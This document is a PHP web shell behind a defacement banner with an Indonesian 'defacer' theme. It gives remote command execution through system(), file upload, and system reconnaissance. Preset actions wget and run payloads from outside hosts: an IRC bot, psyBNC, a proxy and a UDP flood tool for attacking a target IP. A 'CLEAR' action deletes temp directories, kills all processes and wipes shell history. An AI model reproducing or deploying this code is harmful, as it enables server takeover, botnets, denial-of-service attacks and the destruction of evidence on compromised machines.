<title>[ Indonesia Defacer Stupid Red-White Flag ]</title>
<center><img src="http://i1001.photobucket.com/albums/af135/cdos/numerosid0.gif" align="middle" border="0"><br/></center>
<body
 style="color: rgb(255, 0, 0); background-color: rgb(5, 5, 5);"
 alink="#ffff00" link="#3333ff" vlink="#009900">
<div align="center"><img
 src="http://0.gravatar.com/avatar/46742071ef2ea2fdb73a4228a7d7845a?s=200&amp;d=http%3A%2F%2F0.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D200&amp;r=G"
 height="180" width="250"></div>
</body>
<center><img src="http://i1001.photobucket.com/albums/af135/cdos/numerosid0.gif" align="middle" border="0"><br/></center>

<font
 color="#ffffff" face="papyrus" size="5">
<center>
<script language="JavaScript1.2"> 

var message="[cHicLa Stupid People]"
var neonbasecolor="white"
var neontextcolor="#FF0000"
var neontextcolor2="#FF0000"
var flashspeed=100						// speed of flashing in milliseconds
var flashingletters=3						// number of letters flashing in neontextcolor
var flashingletters2=1						// number of letters flashing in neontextcolor2 (0 to disable)
var flashpause=0						// the pause between flash-cycles in milliseconds

///No need to edit below this line/////

var n=0
if (document.all||document.getElementById){
document.write('<font color="'+neonbasecolor+'">')
for (m=0;m<message.length;m++)
document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
document.write('</font>')
}
else
document.write(message)

function crossref(number){
var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
return crossobj
}

function neon(){

//Change all letters to base color
if (n==0){
for (m=0;m<message.length;m++)
crossref(m).style.color=neonbasecolor
}

//cycle through and change individual letters to neon color
crossref(n).style.color=neontextcolor

if (n>flashingletters-1) crossref(n-flashingletters).style.color=neontextcolor2 
if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=neonbasecolor


if (n<message.length-1)
n++
else{
n=0
clearInterval(flashing)
setTimeout("beginneon()",flashpause)
return
}
}

function beginneon(){
if (document.all||document.getElementById)
flashing=setInterval("neon()",flashspeed)
}
beginneon()

//---------></script></center>

<?php set_magic_quotes_runtime(0);
print "<style>body{font-family:trebuchet ms;font-size:10px;}hr{width:100%;height:2px;}</style>";
print "<hr><hr>";
$currentWD = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);
$UName = `uname -a`;
$SCWD = `pwd`;
$UserID = `id`;
$DIR = `ls -al /var/tmp/.../`;
if( $currentWD == "" ) {
$currentWD = $SCWD;
}
print "<table>";
print "<tr><td><b>IP MU NIH:</b></td><td>".$_SERVER['REMOTE_HOST']." (".$_SERVER['REMOTE_ADDR'].")</td></tr>";
print "<tr><td><b>SERVERNYA:</b></td><td>".$_SERVER['SERVER_SIGNATURE']."</td></tr>";
print "<tr><td><b>TYPE SYSTEMNYA:</b></td><td>$UName</td></tr>";
print "<tr><td><b>PERMISSIONSNYA:</b></td><td>$UserID</td></tr>";
print "<tr><td><b>VAR DIREKTORI:</b></td><td>$DIR</td></tr>";
print "</table>";
print "<hr><hr>";
if( $_POST['_act'] == "LIST" ) {
$currentCMD = "ls -al";
}
if( $_POST['_act'] == "DIR" ) {
$currentCMD = "ls -al /var/tmp/;ls -al /dev/shm/;ls -al /tmp/";
}
if( $_POST['_act'] == "CHECK" ) {
$currentCMD = "ps x";
}
if( $_POST['_act'] == "IP" ) {
$currentCMD = "ip a s";
}
if( $_POST['_act'] == "OPEN PORTS" ) {
$currentCMD = "netstat -an";
}
if( $_POST['_act'] == "PSY" ) {
$currentCMD = "mkdir /var/tmp/...;cd /var/tmp/...;wget http://chicla.fileave.com/psy.tar.gz;tar -zxvf psy.tar.gz;rm -rf psy.tar.gz;cd /tmp/.psy;./config $currentCMD $currentCMD;./run;./fuck;rm -rf /tmp/.psy/scripts/DEFAULT.SCRIPT;history -cr";
}
if( $_POST['_act'] == "PROXY" ) {
$currentCMD = "mkdir /var/tmp/...;cd /var/tmp/...;cd /tmp/.../;wget http://worldchipspoker.com/sekip/proxy.tgz;tar -zxvf proxy.tgz;rm -rf proxy.tgz;cd /tmp/.../pro;./prox -d -a -p$currentCMD;history -cr";
}
if( $_POST['_act'] == "CLEAR" ) {
$currentCMD = "mkdir /var/tmp/...;cd /var/tmp/...;rm -rf ...;rm -rf /var/tmp/*;rm -rf /var/tmp/*.*;rm -rf /var/tmp/.*;rm -rf /tmp/*;rm -rf /tmp/*.*;rm -rf /tmp/.*;rm -rf /dev/shm/*;rm -rf /dev/shm/*.*;rm -rf /dev/shm/.*;kill -9 udp;kill -9 tcp;history -cr;kill -9 -1";
}
if( $_POST['_act'] == "BOT" ) {
$currentCMD = "mkdir /var/tmp/...;cd /var/tmp/...;wget http://chicla.fileave.com/bot/ahiak1.txt;chmod 755 ahiak1.txt;perl ahiak1.txt;rm -rf ahiak1.txt";
}
if( $_POST['_act'] == "UDPR1" ) {
$currentCMD = "wget http://chicla.fileave.com/too/udp.txt;mv udp.txt udp.pl;perl udp.pl $currentCMD 0 0";
}
if( $_POST['_act'] == "UDPR2" ) {
$currentCMD = "mkdir /var/tmp/...;cd /var/tmp/...;;wget http://chicla.fileave.com/too/udp.txt;mv udp.txt udp.pl;perl udp.pl $currentCMD 0 0";
}
print "<form method=post enctype=\"multipart/form-data\"><table>";
print "<tr><td><b>ENTER:</b></td><td><input size=60 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"ENTER\"><input type=submit name=_act value=\"UDPR1\"><input type=submit name=_act value=\"UDPR2\"><input type=submit name=_act value=\"BOT\"><input type=submit name=_act value=\"PROXY\"><input type=submit name=_act value=\"PSY\"><input type=submit name=_act value=\"IP\"></td></tr>";
print "<tr><td><b>DIREKTORI:</b></td><td><input size=60 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"LIST\"><input type=submit name=_act value=\"DIR\"><input type=submit name=_act value=\"CHECK\"><input type=submit name=_act value=\"OPEN PORTS\"></td></tr>";
print "<tr><td><b>UPLOAD FILE:</b></td><td><input size=45 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"UPLOAD!\"></td></tr>";
print "<tr><td><input type=submit name=_act value=\"CLEAR\"></td></tr>";
print "</table></form><hr><hr>";
print "<table>";
print "<tr><td>Command Enter = Untuk menjalankan perintah.</td></tr>";
print "<tr><td>Command UDPR1&UDPR2 (Udp Flood Random Port and Paket = Masukkan IP target di kolom ENTER.</td></tr>";
print "<tr><td>Command BOT = Masukkan NickBot IdentBot IP-Shell Channel Owner di kolom ENTER.</td></tr>";
print "<tr><td>Command PROXY = Masukkan port proxy di kolom ENTER.</td></tr>";
print "<tr><td>Command PSY = Masukkan ident(spasi)port di kolom ENTER.</td></tr>";
print "<tr><td>Command IP = Untuk mengetahui IP Shell.</td></tr>";
print "<tr><td>Command LIST = Untuk melihat isi direktori.</td></tr>";
print "<tr><td>Command DIR = Untuk melihat isi direktori var, tmp, dev.</td></tr>";
print "<tr><td>Command OPEN PORTS = Untuk melihat port yg terbuka.</td></tr>";
print "<tr><td>Command CLEAR = Untuk menghapus semua setting & service.</td></tr>";
print "</table></form><hr><hr>";
$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);
if( $_POST['_act'] == "UPLOAD!" ) {
if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
print "<center><b>Upload Gagal</b></center>";
} else {
print "<center><pre>";
system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
print "</pre><b>Upload Ready</b></center>";
} } else {
print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
$currentCMD = "cd ".$currentWD.";".$currentCMD;
system($currentCMD);
print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Succesfull</b></center>";
}
exit;
?>





